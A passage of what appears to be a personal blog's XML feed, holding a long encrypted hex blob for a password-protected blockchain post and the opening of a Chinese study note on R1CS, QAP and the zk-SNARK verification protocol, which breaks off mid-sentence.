849e4baa3109038108532b782719c99984bb991f0ce144576156afc81815f26eddeb7eaabb70395be021e50c260da164613474536627734f371e92948aef5d37ca22a915f71141f1ce52f3c5a447fa2b61de064e2e576ef83533319bb26c83a9816d60b64030af876cd6cf1f6581ee92e98a145149fad31243d237bab99cc309329bc23e853f6ead895ec9168e0d210c877c3ec77c50ce4c7d70f153f872c5542ab43dbe60002e2ee23d884c63e722c1facf511d2f0f38587944d7298eb90c0aa5dc91937b78935c866e4bedfd9ba3fb1109f4bde2ceed10ab0af4e60289ecae34cd683a7557ca02adc9873fe505d030ef8318610beeeab6a0c120a390ab19cfd60039e3b481af82b27dd4b397f6cf162df840525ee147a55d864ccc1b978daa78f503d882431105d0efff24006661c709ab1231fe2da27284701753a0d952a1396d03c580f6e823745a78a7300423ff2f90da25d9cbbb4540b8a1ed1dbfea545f65a1af7e20d8b824f3f4ab9f52c7d1df3b8e80d06643c8adf0e66d43c7d18b825529f8b2dfbfe65386104df57ba67e4387c4339cdf573dc8fc251ece869fd7639c08dd8765607a04a47e99aa1dbeb345e45ff5c895f01ee26f4d3aaf0de32f7913397915c0cb0057714baf198b5fd740d468aa1a4e649b5c93f00979804d76c284e90365e0522ce7c2d4c68cd6f8c4c146d7c21344102a82826bdb3e14951330f6e1948f4eae4ee0c0d402ca782ab71594d6290fb8def9e3552f68b4a3cf5059937a3c10cbbc1feac00311d2d852f81bb7f73d725e2374d1b9c89a6b90f735556538b69801c9a1014281262fb32415d2ceaac3edd493e97ac043d1b1030c6aa35beb0f6452c9c39d3723ae7480d4dd5ec649c3a00b009a28652cc7945ee3fa574b36471f2ddbe6b8b74c9b5f5f65bda9ee21dd85788f1f26d1ca5b4090293e640d81c3bdb1cb1ff10d29f59cceab25fee715b82ba8b428b5db85ad2f41281528a3eadea8aa3f331058baca8740b3d8cb8d9ba838903403e346c4f639b14f0cdc7f2aecedbea95d956f784c403d66e7285c36ad1f29ebb8370ed33e858ee40a7e5428fa483ffde6d9561fac87aae71b92335085a8c23addbaa342c19b9bbb9eed17039b2a7c0311f53ced68507e59619769398fd6577960da727dc88554dffc32d46e01e21ba48128a4cf037b638f67ce837a8ec8f42c9d9b560b183b60e6859b7fe6aef616467172cd97ea97651ccab3fe4b74f6c9017baecf4c4a1f1b4e7b463a21ac76489aa5eeb8afe1c2faf5c2ee177c95fae5fd26802fd0cf44e39699af9524b3e103adc7190666a4e3e2d99fb4f2920359d32507874e6fe54a782ec496206f306ebfe960ad45354a55a30c3933cb8ecb0e4bfd72307d96c3532714249da13f32441b1902ef18462f4770ea6488ee74b4ae7134ccd4388ef03d84760f0b9db1dc8c2b4450f26511aa0930258b5373263f6c09a2716293205a2b290591cd1dc7446f578ffbaba2bcddf5543e995a1d7dc208c1ebb4c8be78b6b57a200055f009730083bb6378bbdf10d8f13122d9883491d4b3eab34760d37834128e1ede74e10edd267d84c2b3c4318ee1ac0881c5af1d714c6cbba54221216243f26002996301ab7e214835eb0a4268b83e0e7957a6041040a05cffbf7c569f384b318f5217ca42588aeffcbe1e857f371c0bb8125b3610ecc2ad550f91ecfc58e9b1f595749a51c22f1606269ae60eaa78c8908e4a9764dda054dafc2ab41b52547407b758c6f404945ef9383e2e173bf997acf812009c5ef205038aaaa45c71c5f817727362d11b51df8fb4a494bad9af01caf76a5ddc395a344cb116118b6d0bbc26f989adb53a97dbd3facfc873711eb139ff1b5c20e350e48a67d8415983a16a43676cb953d5916925b2e0d6e77c7d6589b16a9a14b48bd302b85f2efc1c546f781ed8cf6b0d6891abff22f4dd3bafe24f61ace0d627dc17267b2dc385fd2a9c1d00ef15bbcd44fb6443a6a502591e2efeafa52a5150edc0871fdc139ec7e096016a1d7b010b824e236924f7fb565c1a3734df8e415942f4ff06f1649591c447c05695d57225fab44e0387dec808bb1408ea47d6e13b61d18a89041258e85c0da5cb2264a71437787ed70cc5473b9e9b8a7eda49d6f621d30f8231edcb7783d3db040bce13956ac496d2e29c1a9365479ab19039103d1926fd03917c37493dfbd874f7fddaefed8d8c4dd7b2f4ab19b1c7b4ad8fd5dc8a262f71f0b2e2d96c41d0538cb8607dab0c7f98190c8bcc41558af8e8f657af7f6682ef780538efbdbd2b116504de83197ef23bf56b0fae1e5ee0d6c8201ddc6443774a4c0c2238bda96d090275f135d37e2268e853abf2e72739c348c61488da5e81aa1a5fa83da478f4d8409fa5933e04921839a687a12832731ff6afa3673725ce316bbea4f7f50181a899b96c794a2224b78b9f6428ca132a470d1c9eac4ff73e05219b265d20d0cdc521804bb571eed3b0194b937d3528efb20e6d68169f498ea687eec73bb77060f5cff0bbb5ae3cdc98d0ec61c3df6c3cdfa8ca253fc49e0637de98aed3a712b233f4bd883afc27cc3c3a95a50759df5026c03c3f30782d8cadc83dddef1f6fa82fe2367dc3c9affab0542fd1762f32074e33aeceef7df4548913dd0fa14c17dfaebac999b9cbc1e1ead21cf107350c1499b74e6e36914ec71ccac3dffd9684f953a2ed0dc1e0782a768fcec4e4ef68e4d75598035c56c9d7039f6e6ac03047252b30a0c17cf001c5478ae67651b7cb1724060d3ac61c862bb7011d159e5d22eea66648f098ba30c13e1b17b96cb8112279d9f8c9f241214b640009da5a8db00228b70e40e4e4fbb8b25384925e51ba593ca3e8c4fa1bd277c834e661285b73f3a9a030695e987cb37589b192a7a1d24feb6fb32d9aa54e87efc216f4444b7b553408111a71e23837c8a4969fee7f3ed82ac27f540a8a109e96e98da1a25066bad5e316d260e15483f51a3801d4e355fbce618c82df986baf77461a1e5c2a79132d22eddd862340594a9f4c94aa8191e20a00d943e86cac63b905c44a87819ce153eca57c95e854930de2c6a0b48b677089d94ba9bce379288edf101ee72809532100ada1e85ffa6f0e0c486836275dc5e588f645d0b253f1a5bff84ff0ff7508842e7033d413c523b57cac53c3ad85ea99ae6462180293b004138ebe5bd913b4cd984676e792b99a5d5e545d1b4550730a20587ba5c2604f2df35216712513c03060862f07a2007e4df26c19b0685ee1a41397954f76830e2b704d6e4a4c2436fbe7a46272d79dadb531528a5887583c9500ffb24f9a199a9280116f076adca55f4472b2180bbb2692e276ab27122459121fc53a34479ae5db4b054dc4c8b60d80986b6ef62a036bf3f0d7ec4a39668541b3145c5c73981b84a2820ded128169329ef984e987876e4632c03df0d35bb7af4dbcc2b0c3e4062810b7d0e667002ca2e20ebd2c0062268fc0bb08de23a8f0846bf437d451c914637604e5438a840a462c148a3556ac41c842c9540e4cb9fad80761607d4235c807297a3ca6c6887013068d9f88a8a9539fa7adc566816ef42829da14e236b651809d04abc45a4a7e10d8a4659c6f5557c102eee15ec5a3e800ba18409d621f22d8b9b497e689acc3f49c06bb2ee9d1cd685e9cd23e7de38a900474b1da26df3d7c39ce303d917d1138f91c24b701f628a0f3df03daef6dcd796163bd3a2b9faadec73f56ec6be9b7eb813122d9ca316c7116e02b46526dd8b3f3e9494e4612f9a4e9d3a707100a0b36f198abbc996b64b732d5c31cf1e5a2b20eb4e39eaadc16ff158bec4c78581fcbb75fd694f46b6a21a9caaf006fe22f70bb828c2ded9f71196bb0e6a87e82858fd858802317903f1a54e0f7a058de8881306e4bddb1ccebe8bcf9157a4aa2ca06c0e1e2afd93222fef3f7e5cae73d51391bb74ce06c2285ce0ec35d65afe7b74c353e5312891cf8ad0b6cc3a61f81388f32f150fe181e496eba3e1d00f3f0cf25ca2ed51c563a5b23a437fb0180c79d0b0257da5c0354bebda8261213faf9c404d6f9f3cb41ddbbd97e33b7ef83bbccd58de590bb7fdb06c25e35589da3439cffbfa2f27eb024357c3e3fac74e3e5decc1bd50e2a2cfe7dafdbf687ccf2e77109bd196495537f0edff9f371bef89f876d9e5695c9a2e2babb3b20f8f3f0f757b69add0c331d2abcd0ba935a39e2f3d2fe37daa11c430eb05325ac9cdb89d09d552d998081f16d0a8b08072a70263c3ed8abb65ae9c4d9bbfee72f2ef931c1f1c23846f1240aaeea378179efdabee1930016af409d156420afe6f00c34f0880145305f7f9f96be9b3e2f4c4d488b5295a34e47ad2ec342b8dcda756e174b5e87415136aeb8ab92dc4e8229a4b0b770893d8afe95bc9bf7bec4f2314bef272bcc7d9938f51107d7c218a02a5ffd4af2d7cd3e33cb488b1ac2082488a4223d03379d0f69a45311a1cfa937af6a92e965b47eb101700037827d4af37aa154c7045b3f24c827551ab1d6dcfc6cc3d0b91b9bfd3dd70c38772844782aeed47a3e12abdc85ba557e680f412a9e47804c244c2617aba45695208aa369cb3043161a9a4bde40689745ef98f685568b44f6b5088783f32a029b8eb585bfce5349acf06794aefaf117ba6378b4f20e781abfe3b433048775b8d3e22108942a33320e5af5451fd5047f346af95258bf11067d13fecdcfcfd1fa228d58a9abdf972d26b23d099e3fe3d9927950fb468c8746889c58cfa43bf7a80f42909c09340139e7ffb93e9aa878fc22268bc4f1c6951635857b2cf15c4f42ee4fc6c057f2cf48d7329b4b4466d156cb9bafa0e299fdf8606c0bde4f48e54726b9d5d5e4c07994e28db80b3405f90e05bdb371a727228dbe07c98c97ac62adfeedea48a95324fd59e1dcb7fd08edf14e2eda243fa571020bb6eb30a8b1ddd51b1b8678c386ebd52961bbb45df447ccb3e6a14c884be44d732aeb65c29476d0094c78c06991dd7ac4383e47081faf579a47469e27f4918f9ef5272f505fc4b60a86c459926b5cb24ce8193fcdfb83a29cf4eafc83a1b3d14544ec4c93d34da592bf6053d7d7158e3711b77e571d38929cc2226de860090343791594212348e14a37b640835a165a998273431a5b4b5abab1381636e5a9d7e6f2e660312ffd8631e747604f84eb106cffce5fe704860e1ae4a4ef6a1ff700cb24a1e44b6b83fe81e1a0deaa5929a37faa7e01132f136078bf7f2d60acfb0eb4d520f9c4f8bf6852a41e6e0a2e3961f4333c705171193ca118bd25f37ed9c552e9fb8bde44ba8dc6a3685fabefa28b206920106f4983e5c09033999da78964c7b653ba50342c210aa124f78f3edcb98d13323321924e4f24f925c017997fec6d95119ea16225175c6a624d30caf4ec1d45d7205febe3cfa9e36ed9d7800036ae0eb083088a68199cf569855605e82512f11a8ddb2790baf3ca1b91c5d99cb4a207e716dcc3fa27aef32bfd733c42b1373382fed0aa0447971ee7ac4d018077e8da38cbf002f83cd00b556646ed698d8467e6c3157765546ae5a6ec87a120e3a6728de8abc525404979ca48479b8ed7df5c30e236c40749d17ef0f86ee105a4ee1401b970d2562ed37ead9e4af01abe705a724ca4fc4d9194f45dae42677dbf6e49a42d2f7ca2dca38488a29489a66db22299eb4c16c97279978436eaef926db7a2d1f9a958eadeff67d5f6ff9795df0d497fc1fccf3649647a8a5dff6aa9c32837df8c5ff4179cf1ad017243bf6dede7a351d7580be331bb96428a2a2c61f868a3c1cd8b0155947314d0dfdec62a06fd5317207a9178c8f3a200d9a8e1f4596be813ed84611c46da8c3f52f972db03e864010a0b0d8734db4e873c8d650949179afe2e8895f3547cd5cc14175556deae913b141c0418545dfc41eec8e09fecde2d4a2b7859a7e6ec93ffbfe82e92e6d1dd45aa027962efd00bcc8f6fdd755deb1529f76addb83ad16bc9ec54ef6c8f185632f1cff6c898eda3e56ddcf4af4b499faf18d1a49851eb1cfc54070a377abb1ef1134f7e5a28d01a522200d14c6c8bfbe944e43daf776cdd2a1e935a0be1483e5ff7f1c1609c6a9b147eba1f57c3bb5c11d89ef90f08d744b0302904b364f8b0b6308ffc23276e4f98fe5d5f520a686773a436b3d65f0780fa8533f621822a195bb40aeb02a7ade19f32d2b45d925656deba7e63b72ec249b3ad3dd8367e4cb57c24e175e2b718f1f6975db6fb69b2cf2d427c6fb51ce6012442ed85eaa0e574ccb2168b95c6d795390223065c24fa8aea3cb607c2241d603ecaff7a53b43bac8e10ae2ef40378be7b6c73a75065e8c935ce795e81a3a058df109ab9ee6b3149046195b7d28c69096ddd8b97f6bfbffe8327ff8f27901c9ee4d4ce68f7721064e08be5742fb537743811b7d952e4acf6ec686cab30e6f76bf942509ccc6dc0fe6434a79ce1b4f3613dfcec5b3c230660f0f0242408e26c3d0a3560f91dc6a44adffd7d3bb93a43dcd1cc4bbda52f480199cb3359819611dc08dace791693d122a6c9288e0dbda5ccf3417c4db1b8a3d0a9934fcf82927f58ca356fd671925db2ef95d11ac4a9c47b2a835ea1d5f832fc42ca7d01e21daf60921816d5c88929a80f5add40745d610f01f5e9c0b5d9aa1d70695159cdf449d760dfeb669894472d4fd3bac099243c44b3d650f5e87beea53f77ef369d489d57ac6420c951b587edfadc3caedcd109b2cef9d4a78b5ebf60ac36bb17f6818cf9ef6ef7332ae84622ab3bdd0a0a45c148e8d8c474445144319e35b1a8456f82fcb59031391c8d171a2c00d1d3ca2f67942e7b4b5a00fb141e3a06ffdf3e35b0ad9448380a953d7a1fa225fa7400a9b21c507b3ae50cb6588a85857a504d7dcb9e8662bf8a2c4c49d7313427ae3c6d7f8b9ac112c750639c9c4e55457cfc91b8e31648f17b4ed3c5f3023243ff8d2dc5ad2d82549795115e7bd31c59d5b40875c61948b732dc2d7b496de32f81e41faa9433c8150982b50ddfe3ef570392e06d649330806adc866919aa91e266631c3d513e3036dcbc801eac0ef249849c21f841d9442830ba219cdb5a891204c99f3949dce683b09ed99c6923e66c6b189412e3d5b2d28aa125a78dfd1cca3dc511dc096bf151552138de1ef26ab284c9740c22bdd1a8d50e6f987b785b772d2b5bdd627a8da04a8a3cc9776b5fe60b92d99a81d03a2482847e252c1a6b7946b9663f4dce8f11fa39d18890955b672a48ad5bf35f9a8ae2c9f9d680bd10647c5f90171afe8595da858d14465fc276783c84b5061bf594a9c6e553cbb2e6ce21a8113fa4dc45e85ee19286220469871774f3970d920ec3c8734533861e25845c62de098460f017c3a826683fc80776ba95fb99b9f7e6a208716b7ba452b0050f5c33ae736dca2a2de92717c6dc203b3bf770159b12bb132aeb3279c702761ea2116ffad4679bf9fc948df8459b66291154308a8da3bf04d708ff889ce25ab8eec7a1f629e2e3ef75b45c1f8a27de2b3bcf1d8ed7f046252279576ac7be8e550b7f6daa8846aaa03121d52fa2051bd4819a6ae5c90f623e53d6543152eeb8f31073589e25abe38d1fe796f782624c240fddc0a2ea8689cc08e79b32f07b67d4f4daa9a93da298878bd0c54dc18bfbba99404c301152cb9ba82eead58e249b6acf8639265884c96fd59b92d033219b05a10f1c382737a9f77bb8e01eb0e1feed74aa135471b41270fac3f33336753c28f268c7e47a849139e20ce9a5744770ad7aed2cc9eb375d5a58919c29256903bffedaa07b418ea01f1d6cd264e932df52d8814968a0aef63de42a6aad3841b7b9ad2ccc34cc135eecfa7166ec10239af0d8001980546361ea9869cec59272c1e4a27e1717e2e288951d4299127529c67813a1d7634be469ad406a2a0ec4892fb7342a55c23760869b4e894f09e2ad15e255498cc81edfb9d40b2a9c6bc20ad175bdc3e32c610085f9f92bc6685ffb1dabaf1d486f645981634c18319cb585e051485d30e2b91b58ea84e024e1d32a2cfbef7b613566ce966960991333927bca2533983c1d8623eee274a6f42dada3eb894394ae03aadd06593314bd77d12fc7cfa45c66785afab3bed7d4de2a72f384d1a7125e0d15eeb1d5b9056be68733d63c15788531d102413305af5e26d12d29347e00344356ae1a5c117af23f7011c7b69622a139389d8e45fd13bbd679d6e887481d34d72dd9829e45099697e035d0cb0c4c4433aa98d6d7a62407ad2f1ec465bd658fa044e2dd7f551ea70b99a17e4c291171fd9665d79025d5d1f930544fef2927995441a15ffa9f799bbdfc096c6616ad75165338a5f7f414d5f8cd6648a09f728600e26de0e7a4a35c0a8203e14c5e4dc7a681a7ccadcd4dbce76e1870f727764c5d4e9ccfde6462f7440a2124352f4b145f741161cc5a7388aa14a296952892684b8f9eb76233d0ac999c2c6ac6cff265aebee48e71e6bdd9e9e422b286adb3479be98f6b49e5d8cddac89c34534acc20d9e297b4a0752c9bdc4883e115b1926e4471eba3edd7d03e2ee49b3304c50113b668ec2730d14a5ef57a18200391b003ba31135d722f3ebedfb5d5757f22a9efb6305a3a8a83491349be163215e42aa7bae0eb7a63c6887c0c3bcdc0506ddfad7914a5a20b0ba1a23574cfd381c2365d28d0d02bd2dbeb8ca0f285157c1bc24bee50a8d359ade3413cf45342c34c2b4e52b29b69e10fc9d4061abfa00c220efa5bd50fc788c4f591545022c57eb40bba9d5e58e99a1be8aeabbdd0132cba338c21d276eeb51b6e6d9b326d711bb16b1b4e4b844c0274ecd4f218b08f569c1a6b1871b12221a1782de9e30217e5833223a942f3cd50f1b97b041542503bacc53257c11b9e761435e6aa644a3c7eb24dfeca5d9e8c829eb65160b3b8089caa81f3a2dacd9370017cfc3417d6e041f150dcb934e6c6654701f021ace32f9309ebe73ef08b719cdfbe1a967aac35b7ae54ad8017f45e2dc5d56ed2c6593cea29e23450bef47f266720788cc9f0d177880d68a383947f202ef6f1fd830e47e331570a9cf227c332f72e2379e69743283ae7d66320256fd28917ef9853c6e867713ab3f48f2c7b03790092256840a4517dfc9d3b56b97bf23fdfcdd79cd68ddfb7c1e3caf6399020784ce7b24cbe3eeb79fb318bb3aa5c37c26c4270ca8373a9b70b21a4afb529531854c7d84d11c80198799fb790ed4ed2df77f3a85f71512eecb02cf30fe3486053c3f6775b40364cf0db7cf163c8f847bbc81651ab1405a56bfe2d02b202e6bc4432866689d4a1dbd91f76a22a89b65b4a707c7e06fd307d854b53033d1346295931efe0cc56e4ba007e8c1556c1e64e784cb42bb06645b65effe0baf0cd1fd8dbb407ae1fe87fc63dba13b871e4c1b2f9b3cf25338868504855e98575047d49e5b06b020df58334ab0ac538ca5027722f1406cb007a662a2c0459ae0ed7972ad89400c0a44e3b210f2624fdf2d2c071735a48d1eaa4ec0b45c67e694cef106065a7e6b6846cb2fcdae754c87c51fa03bf0eca5e55225542d275f76f6161f7fa8e9cd24568ead7fd486eb7de13afe11ecf9161e5c9cdefc4a01e7ea65f0d8d7e18a9b1ceae3545c796ee20ac874d090559a06fcb8ca097230126bbdc1dfccdf384faec9ac151b15eb1225eaeafbade532bdeccb712c805f357578e8fb7ce4b8836a4164a16ff92af0bbdca4b5afbe113d8b08182f8694326d7d12c85273d1598a88eda188075f05bd83474bd7a061b3bb1be43d87a274608b43b4bf927a3c228597055488acd3bd0f18666a11ca0978738326e833d291b0da02583265b9ff46c7c390694a81bcda10ed9ef42581640243c62c69e8c65f3911829e936eb4dec305413b8698b4c215e774fb5aeafbbc9d3a155be8081f605643c69a351a1ab616215f0ad45ffe39a2e4d4634c9a417ca913213879398cb4d24fac8fa72ace699e13b1150197773811991fcaf8a1b2592bea9709ade9c399e524225c9d84d83e34f228fa65a44fbc3774243268a62ae3a88ea5b1044260369e312c5ac8c063f6c129933018937aa184f4c25208780880884ebdcb6884205e283a28ef9f1e42e7b38da432678885334b7fe7e399217dde0d6316999d6eb3b534da4a9a41e3c79d0ffd980fc5bfe38e002ea1fcd240b6407feaae9c666edc7afcd67d4506f08d8ff3051ec22d9b73a3c894be69c74c8af769a80048038634d6c0eab06ff7ef7060054ff610e831b74a5a1270185b1690c67234d1ff55853d51d61a78470b010d572377458db89c9a1d00f63d7391de499ad4e1ea4b6161589af95e95ff0a2e090b524f6dfbf7a6def104cdea4da16da4de2ec3c9106fb25cd1ef900d807e1a212edb3af5a8e171207ae5cdd4789cf43dfe0102eb2f1e89eb76c9351870e7a98c3ffa1a4222789425437bd73869ae8e5bfb6acb01b7887c84b78bb566e4bcc19893f01480fe1f6358a4c1f3dd68c7303928ed939ad20721f0f55d9607fab6f956252ccc3e08457b8751f16a024902196b22466bd286b9afdd4ad18b982f2dc63a7f5eeb75ead9506149fdfba1cccfffd6a3ce79ccd5453b0e7668fcbbdc7bf2263962eb7bc7458bb54c058a0b4621b92adecbc20c08903cc9f690dc11e19ebd7e60acfbad8d2710f4682138241369204e196696a1f6c475a8ff2db6e20761c193a12dadf2bc8de17cb056e23ce44a74800eee5fe82892dca8d0aacd82d649990eec91ef71a91a65bdca914b7137e2e3961427267e8c7695b1b2fc3bacce7164bf2fe74015d8d8117141795c6320d21115a780f81d7f471dfb26b869c055d44289140e3d039365566c579c7b627c0255bda2b93e6249ea2db96d6038b3efa8beb21cb5d7a60d4d0a93eff2d99181df00f716b975e9a9925f9653e7a696c75fe0dd55dc8d7f52ae6b6248b8e20d86cf375b2d4b29af1775297552336c1aa6f715e3aff0dc2f6527d9a1eb450070991c0bced092325cb95419768a9aad7b5dd987faefe05be1e3c408da377807d20b01cd828d9821a2c702c95176597efa63be3ca09153fd818043731837c8bd2c346809e8edafc18eefb887b44028280f12114cefc7e83040c107fb445e62aaac0221aea09e11604e94972be7f5e49463c79a6092380b5eafb4dc73d06ae522dd34ed2a5bac617d9153dcdd3b39cd62642772c6eae22bf96a195661df5e0a0a1bc8329bd6b9ea874640c7a3adcfc16f352804a4eb43d9c107828e086b5a0859e03ac7d9e039eea683722951668339d36f911a09f50f209e38de0832845742434de9639368475f41c391a80cf4df8ae039248d225d855627bffe41a982137cd31c172b30523568f2e28f5cdff3aef8f2653a5d01a6893a0baf79f7d415dfcc8a7702b9c75be50b50853bde7746893e8189afeb889a716f9f420665c0da8e41aa0f32263988386bb9f40c3af85362d30bdcf0d7dc80d187e3e3cc79e9ebeeee70a88a8a2bf945963e3d48556114059990587ec8fc48ee30a1d92176fa1dbccecb31dd1eb56104aade3b2cadfeee1fb4928efbc01ad91782a068c69fd193f2d4c25a2e90deb46b63486f314de201e55617a6b1292c558766888be54632768a26e8a5f0c89d323e7b7c00f192c9c8a510580f894906ef9736357e1a709e68a6bab2060f8e5d33ea52060b78144a66d484d62cfb7edacb52f906038e1bbec795cd6aeddf5357e316d903306d82299d05fd6449e283671ddc60c1b03062151fa420e74376ad2bf8a6a6067482e5b9358ec40728b1fb66b3bfd2ebd53e38baf0dc860391fb99621e3c8e573316556aa95e142466854834f294180464b109a64de49a6c03cfb8968da8cc98b818c4fb013ed1a92d457cc92313e929608147a5d605cc44797f631b5501128ea7c893c86bcd1fdaf376b29945c67fbb8cdff734acbc2fcbaf7bd331485240ffd41286b3c40319dd3b819c6a6152a505b729fd0918352656819dec8e4c3609032e0dd4d56d4a983d7a5845806aab6c724018c0aa58ed952cac4a7d481a26d3f613b86b1ea46035b3ab802359304a479d0c043af85e98ca1de50a877b8159b852fc615b18ac1e4c8bc4c3b18170f7e06a903e1bc0f442d3151e9fcdb8eee6faef3237f178e205978d3dcfcde0498b3ba787ae16450550c9463e891abb3fd44b8685494699f77869162d9d25498475e7b4256945e2f8b664db9a264d0277687ad42a255b20fd2c4cf72a629af9a237c219294c003b7d55db49c035b3e899317512b577848788ad1a8d46eeabae8a7068675f617ff7247a9e2fd56f16bd0c0adebb75728bfc84eea239cf1cab914c2ec696b78eed14bc89c08134347d4c3e92c3865251636988fcb094e6f60df124e20ac89278f5004f442da497bc9d9497080aaab10b06997c109f4b54ffd3cdd7155a8717aa1d0eea00705d9cc8596025902e374412cfa58a51292f730a45f22fb5a68b3c90b47151176bfdf6336529e5fc142790eab28b7448c330de171e60a8f7a816f2448606aba7a5ece1333610a45a28fb29b7b1b93d3ddae298b1c5a5a6b26eeed7acfe66bf53cd4d870801e9b20d12f66bfe3b701fcb76d2de169f81d90ec53983065899093a9b86c30e8fd8a70235d7313b972797218d164d9bc7c6098ecf71c675c63d77b8817f86f27fbced6a831067820de0e2b319fd0298d101bf930224541edb5a4970ff6f72a8f7e59145cb435364ac1e3a15bf39689533e08e368384e830dcd55d021077cd0f91f95890d9de97f90f673bd2fcb0c07ede0ae82c4e48f0d0b6f53ce525f1b151ff26985b0edc572f8bd76aa0355cc467ad5d9d042dcf51628e59137577765cbb202889b19081fa17bf5c65c669e9784d53489569709208e4084657a1c6918865705fefd4cbafe54f0e0d4e7d4b4fa19ebed3d34c8ac37356286e942222e9e8f3a0aa00c3a38a249326a5c09a925355446a725e24e01ce0fea9818458db344c31b76b816bf546d7fbfb1269e181331b460c987eaab53fd42486f18d23048162bba86749496767e8d46b3aa3baae61ff9e12d0544f5a8e3081526592683d619b4d11353cc5728da737a9f1245b8b516caed69727af6ccf562ecf95b219f817a91f0deb8fb0a3288dcfff2b2bfb4e512d62606d8529014edb0fd8226b5c527b5754f9b01ca28d8a837c4a8b23cf6bbf67c067c06a762550535f767c726ed87c986c6d544727209f1bb8b28de5b7e192c6a76a51c990ee53f60848a2aca0be03469c6318b338cbf7183cb0f5306015165623a9fb477922e03c7ab16b563d2343c5d674fb53e71cb0514cb6c201302e7dab203fc7e7bb4bc93621a02f778df1df5416fe16152e6e1264cc8c9dae501372446bdf217eb20d962b3474010ebb79b5421252742d74fd42ea376ff85f49ba4f8134fafa9cff841071c43dbf5dae581ef746269bcd</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Learning of NIZK</title>
      <link href="/2020/10/26/Learning-of-NIZK/"/>
      <url>/2020/10/26/Learning-of-NIZK/</url>
      
        <content type="html"><![CDATA[<h3 id="r1cs-of-zk-snarks">R1CS of zk-SNARKS</h3><p>需提前将待证明的命题表达为 R1CS (Rank One Constraint System)</p><p>e.g. 给定等式<span class="math inline">\(x_{1}^{2}x_{2}+x_{1}+1=22\ (x_{1}=3,x_{2}=2)\)</span>，将其化简如下（单元仅包含加/减/乘）</p><p><span class="math inline">\(y=x_{1}+1\quad\leftarrow(1)\)</span> <span class="math inline">\(z=x_{1}\cdot x_{1}\quad\leftarrow(2)\)</span> <span class="math inline">\(u=z\cdot x_{2}\quad\leftarrow(3)\)</span> <span class="math inline">\(v=u+y\quad\leftarrow(4)\)</span></p><p>令解向量<span class="math inline">\(s=(const,x_{1},x_{2},y,z,u,v)=(1,3,2,4,9,18,22)\)</span></p><p><span class="math inline">\(\langle s,a\rangle\cdot\langle s,b\rangle=\langle s,c\rangle\)</span></p><p>for (1), <span class="math inline">\(a=(1,1,0,0,0,0,0),b=(1,0,0,0,0,0,0),c=(0,0,0,1,0,0,0)\)</span></p><p>for (2), <span class="math inline">\(a=(0,1,0,0,0,0,0),b=(0,1,0,0,0,0,0),c=(0,0,0,0,1,0,0)\)</span></p><p>for (3), <span class="math inline">\(a=(0,0,0,0,1,0,0),b=(0,0,1,0,0,0,0),c=(0,0,0,0,0,1,0)\)</span></p><p>for (4), <span class="math inline">\(a=(0,0,0,1,0,1,0),b=(1,0,0,0,0,0,0),c=(0,0,0,0,0,0,1)\)</span></p><p>从上述向量扩展到矩阵<span class="math inline">\(A,B,C\)</span> <span class="math display">\[A=\left[\begin{matrix}1,1,0,0,0,0,0\\0,1,0,0,0,0,0\\0,0,0,0,1,0,0\\0,0,0,1,0,1,0\end{matrix}\right],B=\left[\begin{matrix}1,0,0,0,0,0,0\\0,1,0,0,0,0,0\\0,0,1,0,0,0,0\\1,0,0,0,0,0,0\end{matrix}\right],C=\left[\begin{matrix}0,0,0,1,0,0,0\\0,0,0,0,1,0,0\\0,0,0,0,0,1,0\\0,0,0,0,0,0,1\end{matrix}\right].\]</span> <span class="math inline">\(m=A\cdot s^{T},n=B\cdot s^{T},p=C\cdot s^{T}\)</span></p><p>for i in range(4), <span class="math inline">\(m_{i}\cdot n_{i}=p_{i}\)</span>.</p><p>对A,B,C矩阵作压缩 =&gt; 多项式向量<span class="math inline">\((A_1,A_2,A_3,A_4,A_5,A_6,A_7)\)</span></p><p>即每列作拉格朗日插值，e.g.</p><p>Matrix A的col2 (1,1,0,0)，视作多项式<span class="math inline">\(A_2(x)\)</span>经过点(1,1),(2,1),(3,0),(4,0)</p><p>则<span class="math inline">\(A_{2}(x)=1\cdot\frac{(x-2)(x-3)(x-4)}{(1-2)(1-3)(1-4)}+1\cdot\frac{(x-1)(x-3)(x-4)}{(2-1)(2-3)(2-4)}+0\cdot\frac{(x-1)(x-2)(x-4)}{(3-1)(3-2)(3-4)}+0\cdot\frac{(x-1)(x-2)(x-3)}{(4-1)(4-2)(4-3)}\)</span></p><p><span class="math inline">\(s\cdot A(x)*s\cdot B(x)-s\cdot C(x)=H(x)Z(x)\)</span>, 其中<span class="math inline">\(Z(x)=(x-1)(x-2)(x-3)(x-4)\)</span></p><p>即表示x取1,2,3,4时，左式得到的多项式取值为0</p><h3 id="zk-snarks">zk-SNARKS</h3><p>假设Alice已知<span class="math inline">\(x_{1}^{2}x_{2}+x_{1}+1=22\)</span>的解，要向Bob证明其持有解，但不能直接公开解（零知识证明）</p><p>Bob随机选取点t，该抽样点的值不能让Alice获知，但需要Alice给出P(t), H(t)，供Bob校验是否满足P(t)=H(t)Z(t)</p><h4 id="利用加法同态隐藏抽样点">利用加法同态隐藏抽样点</h4><p>Bob不直接发送抽样点t的值，而是通过同态运算E(Alice无法复刻)</p><p>发送t的一系列指数映射<span class="math inline">\(E(t^{0}),E(t^{1}),E(t^{2}),...\)</span>，Alice利用这些值计算E(P(t))，E(H(t))并供Bob验证</p><p>Bob计算Z(t)后映射至E(Z(t))，验证E(P(t)) ?= <span class="math inline">\(E(E^{-1}(E(H(t)))Z(t))\)</span></p><p>但仍存在问题，</p><p>Alice可以自生成A'(x),B'(x),C'(x)，其s'满足s'A'(x)*s'B'(x)-s'C'(x)=H'(n)Z(n)，则也能绕过验证</p><p>因此令， <span class="math display">\[A(x)=s\cdot A(x)=\sum s_{i}A_{i}(x)\\B(x)=s\cdot B(x)=\sum s_{i}B_{i}(x)\\C(x)=s\cdot C(x)=\sum s_{i}C_{i}(x)\]</span> 则QAP转化为<span class="math inline">\(A(x)*B(x)-C(x)?=H(x)*Z(x)\)</span></p><p>Bob发送M个二元对，<span class="math inline">\((E(A_{1}(t)),E(\alpha_{a}A_{1}(t))),(E(A_{2}(t)),E(\alpha_{a}A_{2}(t))),...(E(A_{M}(t)),E(\alpha_{a}A_{M}(t)))\)</span></p><p>(其中<span class="math inline">\(\alpha_{a}\)</span>是Bob生成的随机数，M是多项式向量A(x)的维度)</p><p>由加法同态，有<span class="math 